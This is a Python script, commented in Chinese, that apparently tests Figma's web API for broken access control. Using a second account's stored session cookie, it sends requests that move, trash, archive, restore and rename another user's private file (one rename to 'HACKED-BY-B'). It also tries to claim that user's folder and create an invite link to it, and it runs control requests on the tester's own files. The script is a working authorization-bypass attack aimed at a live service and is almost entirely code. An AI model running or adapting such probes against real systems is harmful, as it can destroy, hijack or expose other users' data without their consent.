"""文件级 REST 写操作越权矩阵:B 会话对 A 私有文件/folder 执行移动/删除/归档/恢复/重命名/claim/邀请链接
对照:B 对自己文件同样操作确认请求格式有效
"""
import sys, io, json, urllib.request
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
B_UID = "1667396392129259941"
A_F2 = "qzDqStIDJyGbthpKiuvfwg"
B_F = "xFETb3KJ8wh2U8wjD9jJeY"
A_FOLDER = "634606970"      # A 副本所在 drafts folder
B_FOLDER = "636027529"      # B 副本所在 drafts folder
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

def call(label, path, body, method="PUT"):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Cookie": CK_B, "X-Figma-User-ID": B_UID, "Content-Type": "application/json"}
    req = urllib.request.Request("https://www.figma.com" + path, headers=hdrs,
                                 data=json.dumps(body).encode(), method=method)
    try:
        r = urllib.request.urlopen(req, timeout=25)
        raw = r.read().decode(errors='replace')
        print(f"[{label}] {r.status} {raw[:420]}")
        return raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] {e.code} {raw[:420]}")
        return raw
    except Exception as e:
        print(f"[{label}] !! {type(e).__name__} {str(e)[:70]}")
        return None

print("========== B→A 私有(越权面) ==========")
call("1 移动A文件→B的folder", "/api/files_batch",
     {"files": [{"key": A_F2, "folder_id": B_FOLDER, "drafts_to_move": False, "is_multi_move": False, "restore_files": False}]})
call("2 删除A文件(trash)", "/api/files_batch", {"files": [{"key": A_F2}]}, "DELETE")
call("3 归档A文件", "/api/files_batch", {"files": [{"key": A_F2}], "trashed": True}, "DELETE")
call("4 恢复A文件", "/api/files_batch/restore",
     {"files": [{"key": A_F2}], "batch_fail_on_file_limit": True}, "POST")
call("5 重命名A文件", f"/api/files/{A_F2}", {"key": A_F2, "name": "HACKED-BY-B"})
call("6 B claim A的folder", f"/api/folders/{A_FOLDER}/claim", {}, "POST")
call("7 B生成A的folder邀请链接", "/api/folder_join_link", {"folder_id": A_FOLDER, "level": "viewer"})
call("8 trash_bulk A的folder+文件", "/api/folder_items/trash_bulk",
     {"folder_items": [{"folder": {"id": A_FOLDER}}, {"file": {"key": A_F2}}]})
call("9 把A文件移入B的folder(move_bulk)", "/api/folder_items/move_bulk",
     {"folder": {"parent_folder_id": B_FOLDER},
      "folder_items": [{"file": {"key": A_F2}}]})
call("10 can_move_bulk探测A文件→B folder", "/api/folder_items/can_move_bulk",
     {"folder": {"parent_folder_id": B_FOLDER},
      "folder_items": [{"file": {"key": A_F2}}]}, "POST")
call("11 移除A文件recent视图", "/api/files_batch/view", {"file_keys": [A_F2]}, "DELETE")

print("\n========== B→自己(对照,验证格式) ==========")
call("C1 移动B文件→B的folder", "/api/files_batch",
     {"files": [{"key": B_F, "folder_id": B_FOLDER, "drafts_to_move": False, "is_multi_move": False, "restore_files": False}]})
call("C2 重命名B文件", f"/api/files/{B_F}", {"key": B_F, "name": "renamed-by-B"})
call("C3 B生成自己folder邀请链接", "/api/folder_join_link", {"folder_id": B_FOLDER, "level": "viewer"})
call("C4 trash_bulk B自己folder", "/api/folder_items/trash_bulk",
     {"folder_items": [{"folder": {"id": B_FOLDER}}]})
call("C5 can_move_bulk B文件→B folder", "/api/folder_items/can_move_bulk",
     {"folder": {"parent_folder_id": B_FOLDER},
      "folder_items": [{"file": {"key": B_F}}]}, "POST")
